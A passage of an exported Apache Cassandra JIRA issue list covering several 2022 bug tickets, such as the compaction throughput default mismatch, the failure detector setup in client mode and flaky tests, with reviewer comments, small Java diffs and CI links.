Result looks green, except one failure. The test failure already has a tracking JIRA CASSANDRA-17674;;;","16/Aug/22 22:32;yifanc;Committed into cassandra 4.0 as [84e10d0cad5|https://github.com/apache/cassandra/commit/84e10d0cad5e34ef50d6951ca33714dfde0caa53] and merged up to 4.1 and trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
compaction_thoughput default value is different in cassandra.yaml and the Config class,CASSANDRA-17790,13474581,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,01/Aug/22 21:28,05/Oct/22 22:22,13/Jul/23 08:40,08/Aug/22 17:29,4.0.6,4.1,4.1-beta1,,,,Local/Config,,,,0,,"compaction_throughput (respectively being named compaction_throughput_mb_per_sec in 4.0) needs to have default value of 64MiB/s in the Config class in 4.0, 4.1 and current trunk post CASSANDRA-14902, confirmed with the reviewer. ",,e.dimitrova,frankgh,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-14902,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17725,,CASSANDRA-17792,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Aug 08 17:27:18 UTC 2022,,,,,,,All,,,,"0|z17dk0:",9223372036854775807,,,,frankgh,mck,,,Low,,4.0.0,,https://github.com/apache/cassandra/commit/e5e13c02ccf386093153fd6824fd85ef7bd24eb3,,,,,,,,,"||Patch||CircleCI||
|[4.0|https://github.com/apache/cassandra/commit/68e259c23d17febe61b290bfdd4ec246530fe7f9]|[CI in progress|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1834/workflows/c5c61174-bfe2-4aa2-aac5-d52d816a9373]|
|[4.1|https://github.com/apache/cassandra/commit/0b2607e886af98a2bd946aa72067447142839e86]|[CI in progress|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-4.1] |
|[trunk|https://github.com/apache/cassandra/commit/c365fa65328570b473272c32e5942675e0dc50d3]|[CI in progress|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-trunk] |

 ",,,,,"01/Aug/22 23:17;e.dimitrova;||Patch||CircleCI||
|[4.0|https://github.com/apache/cassandra/commit/68e259c23d17febe61b290bfdd4ec246530fe7f9]|[CI in progress|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1834/workflows/c5c61174-bfe2-4aa2-aac5-d52d816a9373]|
|[4.1|https://github.com/apache/cassandra/commit/0b2607e886af98a2bd946aa72067447142839e86]|[CI in progress|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-4.1] |
|[trunk|https://github.com/apache/cassandra/commit/c365fa65328570b473272c32e5942675e0dc50d3]|[CI in progress|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-trunk] |

I marked it as a blocker as we are running many Python dtests for example with default Config value and not reading full yaml. ;;;","02/Aug/22 01:12;e.dimitrova;Some of the tests in 4.1 failed due to environmental issues. I restarted them.

Trunk has some new failure. I will verify tomorrow what is going on not to miss any failure due to this particular patch. ;;;","02/Aug/22 14:01;e.dimitrova;4.0 CI run completed all green, the tests I restarted in 4.1 completed also fully green.

testCDCOnRepairIsEnabled failed with Java 8 with/without vnodes on trunk. The test doesn't fail for me locally. I will investigate now. I don't see direct relation between this patch and that test but let's see...;;;","02/Aug/22 15:33;e.dimitrova;This test was added only to trunk in June so the issue is local only for trunk. It was added as part of  CASSANDRA-17666.

It seems it has some small flakiness  [with|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-trunk] (#1836) and [without|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=clean-trunk] my patch and also, this flakiness
was [there|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17666] when the test was introduced. 

I will open a follow up ticket for -CASSANDRA-17666 -   and ping the author.

 This is ready for review;;;","02/Aug/22 15:45;e.dimitrova;CASSANDRA-17725 opened for the test flakiness on trunk;;;","02/Aug/22 17:43;frankgh;A quick look at documentation and it states that default is 16MB/s:

setcompactionthroughput
How fast compaction should run at most - defaults to 16MB/s, but note that it is likely not possible to reach this throughput.
 
https://cassandra.apache.org/doc/latest/cassandra/operating/compaction/index.html

Do we need to update the documentation as well? Which one is correct? 16MB/s or 64MB/s;;;","02/Aug/22 19:26;e.dimitrova;You are right, I missed we have it in the docs (not only cassandra.yaml which updates automatically in the docs) and we need to update it, good catch! Thanks! I will push that in a bit.

The right one is 64MiB/s, it was missed to be updated in Config in the original ticket linked here - CASSANDRA-14902, I [confirmed|https://github.com/apache/cassandra/commit/8599f93d9a6b198913228c05accceba9398ba17a#r79275415] it also with [~mck] 

From the original ticket, there is linked a [dev mail thread with community agreement|https://lists.apache.org/thread/j2l3xhfdt88mk5hgo610cghmt5o5z30r] on changing the value and it was changed but only in cassandra.yaml.;;;","02/Aug/22 19:37;e.dimitrova;I pushed [this|https://github.com/ekaterinadimitrova2/cassandra/commit/a75f23b86c9572603111f28f1cc0b257542b298f] follow-up commit to all branches.

I believe that should be enough for now. Other changes should be done when we get back to the docs migration/revision.

WDYT? ;;;","02/Aug/22 19:41;frankgh;+1 it looks good to me;;;","02/Aug/22 20:33;e.dimitrova;Thanks!

Note to self on commit: CHANGES.txt plus Upgrade entry in NEWS.txt for people who might be relying on the internal value so we don't break anyone;;;","07/Aug/22 21:08;mck;+1

(had to search for the branches, as only the commits are referenced above…);;;","08/Aug/22 14:45;e.dimitrova;Thanks, [~mck] and I do apologize for not posting the branches. Normally I open a PR but I hit some bug these days when I try to close PRs so my intentions not to open new ones until the issue is fixed; to reduce the clutter.

I just rebased all branches and started new CI run, pending commit on it:
||Branch||CI run||
|[4.0|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17790-4.0]|[CircleCI #1848|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-4.0]|
|[4.1|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17790-4.1]|[CircleCI #1849|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-4.1]|
|[trunk|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17790-trunk]|[CircleCI #1850|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17790-trunk]|;;;","08/Aug/22 16:28;e.dimitrova;Good news, all branches are fully green! Starting commit soon :) ;;;","08/Aug/22 17:27;e.dimitrova;Committed, thanks

To https://github.com/apache/cassandra.git

   821e7ab7bd..e5e13c02cc  cassandra-4.0 -> cassandra-4.0

   63231aa826..a7d7708976  cassandra-4.1 -> cassandra-4.1

   8691d9b6d7..61d9ba6dff  trunk -> trunk

 

Also, for the record, I checked whether we've been setting explicitly this parameter to the old value somewhere else in the test/conf yaml files and in-jvm tests, in the DTest or CCM repo - Only other values like 1 or 0 for corner cases. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
`DatabaseDescriptor#clientInitialization` should set the `newFailureDetector` (maybe to a NoOpFailureDetector?),CASSANDRA-17782,13474020,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,drohrer,drohrer,drohrer,28/Jul/22 14:27,05/Oct/22 22:22,13/Jul/23 08:40,10/Aug/22 19:16,4.1,4.1-beta1,,,,,Local/Startup and Shutdown,,,,0,,"With the introduction of a configurable FailureDetector, client users of the {{cassandra-all}} jar now need to call not just `clientInitialization` but also `setDefaultFailureDetector` in order to avoid an NPE when the failure detector is constructed. This is a breaking change from previous versions where this was not necessary.

Calls to {{DatabaseDescriptor#clientInitialization}} should set {{newFailureDetector}} to +something+, either by calling {{setDefaultFailureDetector}} or creating a different (NoOp?) FailureDetector.",,drohrer,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16930,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Aug/22 14:22;drohrer;CASSANDRA-17782.patch;https://issues.apache.org/jira/secure/attachment/13047486/CASSANDRA-17782.patch",,,,,1.0,drohrer,,,,,,,,,,,,,,Code -> Bug - Unclear Impact,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Aug 10 19:16:33 UTC 2022,,,,,,,All,,,,"0|z17a3s:",9223372036854775807,,,,brandon.williams,maedhroz,,,Low,,4.1-alpha1,,https://github.com/apache/cassandra/commit/f5dc9a1c1e27ac5ea0cb972ceaf68d5993804d6f,,,,,,,,,Tested by removing the call to {{setDefaultFailureDetector}} from {{{}CQLSSTableWriterClientTest{}}}.,,,,,"28/Jul/22 19:05;e.dimitrova;[~benedict] , [~samt], [~maedhroz] maybe anyone of you wants to comment on this as I see the DatabaseDescriptor.newFailureDetector was added in CASSANDRA-16930? ;;;","28/Jul/22 21:16;drohrer;I should have a patch available for this soon - only real question, I think, is if we want to add a {{NoOpFailureDetector}} or just call {{{}setDefaultFailureDetector{}}}. While it may make sense to add the new NoOpFailureDetector, I don't think it matters much either way as I doubt the failure detector is called at all in client mode, and otherwise it's a 2-line code change (one production, one test) and it would retain the previous behavior.;;;","01/Aug/22 14:12;drohrer;Likely the only thing that really matters in any way is that we register the {{FailureDetector}} instance as an MBean with the default implementation (as its constructor registers itself) - I don't +think+ this is really an issue, and I don't see the failure detector actually being +touched+ by anything at runtime in tests, so it's probably fine to just call {{setDefaultFailureDetector}} and leave the patch as simple as possible. I'd appreciate feedback on that though.;;;","09/Aug/22 23:12;maedhroz;+1

Agree the side effects of instantiating {{FailureDetector}} look harmless if the Gossiper or someone else refers to the singleton.;;;","10/Aug/22 13:30;brandon.williams;[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17782-4.1] [!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1859/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1859/pipeline]

[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17782-trunk] [!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1860/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1860/pipeline]
;;;","10/Aug/22 19:16;brandon.williams;Looks good to me and no new failures in CI, committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When doing a host replacement, -Dcassandra.broadcast_interval_ms is used to know when to check the ring but checks that the ring wasn't changed in -Dcassandra.ring_delay_ms, changes to ring delay should not depend on when we publish load stats",CASSANDRA-17776,13473411,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,25/Jul/22 22:57,27/Jul/22 13:38,13/Jul/23 08:40,26/Jul/22 20:49,5.0,,,,,,Consistency/Bootstrap and Decommission,,,,0,,"In some cases changing the ring delay to be higher is desired (such as when network is slower), but in order to do a host replacement operators need to know that there is a relationship with -Dcassandra.broadcast_interval_ms which is used to publish LOAD via gossip. This relationship should not be relied on and instead we should sleep based off ring delay rather than delay when we publish loads.",,dcapwell,maedhroz,,,,,,,,,,,,,"jonmeredith commented on code in PR #1750:
URL: https://github.com/apache/cassandra/pull/1750#discussion_r930090984


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1776,11 +1776,18 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
         {
             if (!isReplacingSameAddress())
             {
+                // Historically BROADCAST_INTERVAL was used, but this is unrelated to ring_delay, so using it to know
+                // how long to sleep only works with the default settings (ring_delay=30s, broadcast=60s).  For users
+                // who are aware of this relationship, this coupling should not be broken, but for most users this
+                // relationship isn't known and instead we should rely on the ring_delay.
+                // See CASSANDRA-17776
+                long sleepDelayMillis = Math.max(LoadBroadcaster.BROADCAST_INTERVAL, ringTimeoutMillis * 2);
                 try
                 {
                     // Sleep additionally to make sure that the server actually is not alive
                     // and giving it more time to gossip if alive.
-                    Thread.sleep(LoadBroadcaster.BROADCAST_INTERVAL);
+                    logger.info(""Sleeping for {}ms waiting to make sure no new updates happen for {}"", sleepDelayMillis, DatabaseDescriptor.getReplaceAddress());

Review Comment:
   drive by: `updates happen` is vague, especially in StorageService - `gossip updates`, `metadata updates` or `token updates` might be more helpful to operators.



;26/Jul/22 15:12;githubbot;600","dcapwell commented on code in PR #1750:
URL: https://github.com/apache/cassandra/pull/1750#discussion_r930296439


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -1776,11 +1776,18 @@ public Collection<InetAddressAndPort> prepareForBootstrap(long schemaTimeoutMill
         {
             if (!isReplacingSameAddress())
             {
+                // Historically BROADCAST_INTERVAL was used, but this is unrelated to ring_delay, so using it to know
+                // how long to sleep only works with the default settings (ring_delay=30s, broadcast=60s).  For users
+                // who are aware of this relationship, this coupling should not be broken, but for most users this
+                // relationship isn't known and instead we should rely on the ring_delay.
+                // See CASSANDRA-17776
+                long sleepDelayMillis = Math.max(LoadBroadcaster.BROADCAST_INTERVAL, ringTimeoutMillis * 2);
                 try
                 {
                     // Sleep additionally to make sure that the server actually is not alive
                     // and giving it more time to gossip if alive.
-                    Thread.sleep(LoadBroadcaster.BROADCAST_INTERVAL);
+                    logger.info(""Sleeping for {}ms waiting to make sure no new updates happen for {}"", sleepDelayMillis, DatabaseDescriptor.getReplaceAddress());

Review Comment:
   went with `gossip updates`



;26/Jul/22 18:34;githubbot;600","smiklosovic closed pull request #1750: CASSANDRA-17776: When doing a host replacement, -Dcassandra.broadcast_interval_ms is used to know when to check the ring but checks that the ring wasn't changed in -Dcassandra.ring_delay_ms, changes to ring delay should not depend on when we publish load stats
URL: https://github.com/apache/cassandra/pull/1750


;27/Jul/22 13:38;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jul 26 18:38:34 UTC 2022,,,,,,,All,,,,"0|z176cg:",9223372036854775807,,,,brandon.williams,maedhroz,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/2251c4390015853a506223534daf4046289b802e,,,,,,,,,run existing tests,,,,,"25/Jul/22 23:17;brandon.williams;Good catch.  +1 assuming CI is good.;;;","25/Jul/22 23:31;maedhroz;+1;;;","26/Jul/22 18:38;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17776-trunk-9E3D2632-7760-4CBE-B965-D15695F722DC]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17776-trunk-9E3D2632-7760-4CBE-B965-D15695F722DC]|[build|unknown]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test: org.apache.cassandra.tools.nodetool.TpStatsTest,CASSANDRA-17771,13472942,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,22/Jul/22 16:20,05/Oct/22 22:22,13/Jul/23 08:40,27/Jul/22 17:53,4.1,4.1-beta1,,,,,Test/unit,,,,0,,"
{code}
junit.framework.AssertionFailedError: 
Expecting:
{code}

...

{code}

to contain pattern:
  ""ECHO_RSP\D.*[1-9].*""
	at org.apache.cassandra.tools.nodetool.TpStatsTest.testTpStats(TpStatsTest.java:137)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{code}

",,claude,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 27 17:53:12 UTC 2022,,,,,,,All,,,,"0|z173gg:",9223372036854775807,,,,maedhroz,,,,Low,,4.1-alpha1,,https://github.com/apache/cassandra/commit/1fef492e2bedc024e994a173222d27c6f8d7f0a3,,,,,,,,,run CI,,,,,"27/Jul/22 16:51;brandon.williams;||Branch||Circle||
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17771-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/562/workflows/93a47808-b3d1-44d3-ae39-84d27c4f3d8b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/562/workflows/2c91d342-4f68-42a6-a136-4185ff931d6b]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17771-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/563/workflows/99244599-7d91-48fe-973d-615427ecd219], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/563/workflows/1d60c4bb-bb92-45bd-9428-751b4e51669f]|

The problem is this test always expects an echo response, but there's no guarantee that has been processed during this test, so sometimes it fails.  Patch to relax this requirement.;;;","27/Jul/22 17:47;maedhroz;+1;;;","27/Jul/22 17:53;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix org.apache.cassandra.simulator.test.ShortPaxosSimulationTest.simulationTest,CASSANDRA-17769,13472915,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,e.dimitrova,e.dimitrova,22/Jul/22 14:18,22/Nov/22 15:47,13/Jul/23 08:40,27/Jul/22 20:20,4.1,4.1-rc1,5.0,,,,CI,,,,0,,"Fix org.apache.cassandra.simulator.test.ShortPaxosSimulationTest.simulationTest failing on current trunk:
https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1795/workflows/bc8619bb-7301-4428-9662-bc24e5f38b87/jobs/13335/tests#failed-test-0

and also in this run 

https://app.circleci.com/pipelines/github/driftx/cassandra/551/workflows/ba8cadb9-025f-46f9-b663-69d9e956d30d/jobs/6596/tests",,benedict,dcapwell,e.dimitrova,maedhroz,,,,,,,,,,,"maedhroz commented on PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#issuecomment-1196004129

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17769-4.1


;26/Jul/22 21:32;githubbot;600","dcapwell commented on code in PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#discussion_r930437851


##########
src/java/org/apache/cassandra/db/Directories.java:
##########
@@ -1197,6 +1197,11 @@ public static boolean isSecondaryIndexFolder(File dir)
         return dir.name().startsWith(SECONDARY_INDEX_NAME_SEPARATOR);
     }
 
+    public static boolean isSecondaryIndexFolder(Path dir)
+    {
+        return dir.getFileName().toString().startsWith(SECONDARY_INDEX_NAME_SEPARATOR);

Review Comment:
   `getFileName().toString()` really always hated that pattern =/



##########
src/java/org/apache/cassandra/io/sstable/SSTableHeaderFix.java:
##########
@@ -301,7 +301,7 @@ void processFileOrDirectory(Path path)
               .filter(p -> {
                   try
                   {
-                      return Descriptor.fromFilenameWithComponent(new File(p.toFile())).right.type == Component.Type.DATA;
+                      return Descriptor.fromFilenameWithComponent(new File(p.toFile())).right.type == Component.Type.DATA; // checkstyle: permit this invocation

Review Comment:
   do we need to allow? `org.apache.cassandra.io.util.File#File(java.nio.file.Path)` we can just pass in the `p`?  this compiles for me locally
   
   ```
   return Descriptor.fromFilenameWithComponent(new File(p)).right.type == Component.Type.DATA;
   ```



##########
src/java/org/apache/cassandra/service/snapshot/SnapshotLoader.java:
##########
@@ -80,7 +80,7 @@ public Set<TableSnapshot> loadSnapshots()
         {
             try
             {
-                if (dataDir.toFile().exists())
+                if (Files.exists(dataDir))

Review Comment:
   When switching I always forget if there is a subtle difference with regard to bad disks...
   
   
   `java.nio.file.Files#exists` does
   
   ```
   } catch (IOException x) {
               // does not exist or unable to determine if file exists
               return false;
           }
   ```
   
   and File calls `java.io.UnixFileSystem#getBooleanAttributes0`... which is native... it doesn't say it throws... so if disk is bad... does it fail or return false?



;26/Jul/22 21:54;githubbot;600","belliottsmith commented on code in PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#discussion_r930476729


##########
src/java/org/apache/cassandra/db/Directories.java:
##########
@@ -1197,6 +1197,11 @@ public static boolean isSecondaryIndexFolder(File dir)
         return dir.name().startsWith(SECONDARY_INDEX_NAME_SEPARATOR);
     }
 
+    public static boolean isSecondaryIndexFolder(Path dir)
+    {
+        return dir.getFileName().toString().startsWith(SECONDARY_INDEX_NAME_SEPARATOR);

Review Comment:
   `import static org.apache.cassandra.io.util.PathUtils.filename`
   
   `filename(dir)`



;26/Jul/22 22:56;githubbot;600","belliottsmith commented on code in PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#discussion_r930478515


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotLoader.java:
##########
@@ -80,7 +80,7 @@ public Set<TableSnapshot> loadSnapshots()
         {
             try
             {
-                if (dataDir.toFile().exists())
+                if (Files.exists(dataDir))

Review Comment:
   `java.io.File` rarely throws, and doesn't in this case, so the two are consistent behaviourally. It even goes so far as to return 0 for most methods that return a long in the case of error. 
   
   Or you could simply do `new File(dataDir).exists()`



;26/Jul/22 23:00;githubbot;600","maedhroz commented on code in PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#discussion_r930632148


##########
src/java/org/apache/cassandra/io/sstable/SSTableHeaderFix.java:
##########
@@ -301,7 +301,7 @@ void processFileOrDirectory(Path path)
               .filter(p -> {
                   try
                   {
-                      return Descriptor.fromFilenameWithComponent(new File(p.toFile())).right.type == Component.Type.DATA;
+                      return Descriptor.fromFilenameWithComponent(new File(p.toFile())).right.type == Component.Type.DATA; // checkstyle: permit this invocation

Review Comment:
   That looks good. `SSTableHeaderFixTest` passes just fine w/ `new File(p)`.



;27/Jul/22 05:24;githubbot;600","maedhroz commented on code in PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#discussion_r930636721


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotLoader.java:
##########
@@ -80,7 +80,7 @@ public Set<TableSnapshot> loadSnapshots()
         {
             try
             {
-                if (dataDir.toFile().exists())
+                if (Files.exists(dataDir))

Review Comment:
   I'll just use `o.a.c.io.util.File#exists()` here and in `BinLog`.



;27/Jul/22 05:34;githubbot;600","maedhroz commented on PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#issuecomment-1196285425

   @belliottsmith @dcapwell Made the suggested changes and kicked off the tests again. (The first run was 100% green.)


;27/Jul/22 05:36;githubbot;600","maedhroz commented on PR #1760:
URL: https://github.com/apache/cassandra/pull/1760#issuecomment-1197045171

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17769-trunk


;27/Jul/22 16:58;githubbot;600","maedhroz commented on PR #1760:
URL: https://github.com/apache/cassandra/pull/1760#issuecomment-1197319101

   Committed in https://github.com/apache/cassandra/commit/ea03af460511442e771ddd704d92568a63557686


;27/Jul/22 20:15;githubbot;600","maedhroz closed pull request #1760: CASSANDRA-17769 (trunk) Remove usages of Path#toFile() in the snapshot apparatus
URL: https://github.com/apache/cassandra/pull/1760


;27/Jul/22 20:15;githubbot;600","maedhroz commented on PR #1756:
URL: https://github.com/apache/cassandra/pull/1756#issuecomment-1197319622

   Committed in https://github.com/apache/cassandra/commit/3a0936b61f63d8d7ab08bda411dd7d5963cafe0b


;27/Jul/22 20:15;githubbot;600","maedhroz closed pull request #1756: CASSANDRA-17769 4.1 Remove usages of Path#toFile() in the snapshot apparatus
URL: https://github.com/apache/cassandra/pull/1756


;27/Jul/22 20:15;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,7200,,,0,7200,,,,,,,,,,,,,,,CASSANDRA-17619,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 27 19:43:11 UTC 2022,,,,,,,All,,,,"0|z173ag:",9223372036854775807,,,,benedict,dcapwell,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/3a0936b61f63d8d7ab08bda411dd7d5963cafe0b,,,,,,,,,Existing tests should validate the code-paths changed in this patch.,,,,,"22/Jul/22 15:45;benedict;Looks like people are using {{toFile}} when they shouldn't :(

Now we're using {{Path}} you cannot safely invoke {{toFile}}, since most implementations of {{Path}} inherently cannot support it.

We should update {{checkstyle}} to forbid it, I guess.
;;;","26/Jul/22 21:34;maedhroz;|patch|Circle CI|
|[4.1|https://github.com/apache/cassandra/pull/1756]|[J8|https://app.circleci.com/pipelines/github/maedhroz/cassandra/477/workflows/42445cb0-aa56-42ae-b41f-5f553ea4cd15]|[J11|https://app.circleci.com/pipelines/github/maedhroz/cassandra/477/workflows/05e18759-6b4f-4db3-bc5f-4b245551e99e]|
|[trunk|https://github.com/apache/cassandra/pull/1760]|[J8|https://app.circleci.com/pipelines/github/maedhroz/cassandra/480/workflows/7248faa5-a3f2-4acb-bc2f-3616b0eca0b8]|[J11|https://app.circleci.com/pipelines/github/maedhroz/cassandra/480/workflows/70a32dbc-3a8a-4464-8623-22365a13d07c]|;;;","27/Jul/22 16:58;dcapwell;LGTM +1;;;","27/Jul/22 19:43;maedhroz;Tests are clean. Starting commit...;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Restore streaming_keep_alive_period functionality on the netty control streaming channel,CASSANDRA-17768,13472792,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,aleksey,e.dimitrova,e.dimitrova,22/Jul/22 00:08,09/Nov/22 11:06,13/Jul/23 08:40,09/Nov/22 11:06,4.1,4.1-rc1,5.0,,,,Legacy/Streaming and Messaging,,,,0,,"While working on another ticket I noticed that after [CASSANDRA-16927] CEP-10 Phase 1: Refactor Streaming 

streaming_keep_alive_period is not used anymore, except to print it in error message [here|https://github.com/apache/cassandra/blob/cassandra-4.1/src/java/org/apache/cassandra/streaming/StreamSession.java#L689]

